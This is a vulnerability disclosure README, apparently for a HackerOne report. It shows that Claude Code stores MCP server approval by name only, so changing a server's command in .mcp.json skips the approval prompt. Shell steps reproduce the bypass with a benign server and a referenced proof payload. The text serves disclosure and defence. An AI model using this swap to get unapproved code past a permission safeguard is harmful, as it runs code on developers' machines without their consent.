# MCP Server Config Swap — Claude Code Approval Bypass

Claude Code approves MCP servers by name only. Changing the `command` in `.mcp.json` while keeping the same server name bypasses the approval prompt → arbitrary code execution.

- **Affected**: Claude Code v2.1.63 (latest)
- **Class**: Same as CVE-2025-54136 (MCPoison / Cursor)
- **CWE**: CWE-345
- **CVSS 4.0**: 8.5 High

## Reproduction

All commands are manual. No automation scripts needed.

**Prerequisite**: Claude Code installed, default settings (no `--dangerously-skip-permissions`). If you have `skipDangerousModePermissionPrompt: true` or `"*"` in your permissions, temporarily set clean settings (see step 0).

### Step 0 — Clean settings (if needed)

If you've customized your Claude Code permissions, back up and reset:

```bash
cp ~/.claude/settings.json ~/.claude/settings.json.bak
cp ~/.claude/settings.local.json ~/.claude/settings.local.json.bak

echo '{"enabledPlugins":{},"effortLevel":"medium"}' > ~/.claude/settings.json
echo '{"permissions":{"allow":[]}}' > ~/.claude/settings.local.json
```

Restore later with:
```bash
cp ~/.claude/settings.json.bak ~/.claude/settings.json
cp ~/.claude/settings.local.json.bak ~/.claude/settings.local.json
```

### Step 1 — Create test repo with legitimate MCP server

```bash
mkdir /tmp/poc-mcp && cd /tmp/poc-mcp
git init && git config user.email "test@test.local" && git config user.name "Test"

cp /path/to/this/repo/servers/legit-server.sh ./legit-server.sh
chmod +x legit-server.sh

cat > .mcp.json << EOF
{"mcpServers":{"helper":{"command":"$(pwd)/legit-server.sh"}}}
EOF

git add -A && git commit -m "init"
```

### Step 2 — Approve the server

```bash
cd /tmp/poc-mcp
claude
```

Prompt appears:
```
New MCP server found in .mcp.json: helper
1. Use this and all future MCP servers in this project
2. Use this MCP server           ← select this
3. Continue without using this MCP server
```

Select **2**, then `/exit`.

### Step 3 — Verify name-only storage

```bash
cat /tmp/poc-mcp/.claude/settings.local.json
```

Expected: `{"enabledMcpjsonServers":["helper"]}` — name only, no command hash.

### Step 4 — Swap the command

```bash
cd /tmp/poc-mcp
cp /path/to/this/repo/servers/evil-server.sh ./evil-server.sh
chmod +x evil-server.sh

cat > .mcp.json << EOF
{"mcpServers":{"helper":{"command":"$(pwd)/evil-server.sh"}}}
EOF

git add -A && git commit -m "update helper"
```

### Step 5 — Re-open Claude Code

```bash
cd /tmp/poc-mcp
claude
```

No approval prompt. `evil-server.sh` executes immediately.

### Step 6 — Verify

```bash
cat /tmp/poc-mcp-pwned.txt
```

### Cleanup

```bash
rm -rf /tmp/poc-mcp /tmp/poc-mcp-pwned.txt /tmp/poc-mcp-legit.log
# Restore settings if you backed them up in step 0
```

## Files

- `servers/legit-server.sh` — benign MCP server (user approves this)
- `servers/evil-server.sh` — payload (executes after swap, writes proof to `/tmp/poc-mcp-pwned.txt`)
- `REPORT.md` — full HackerOne report
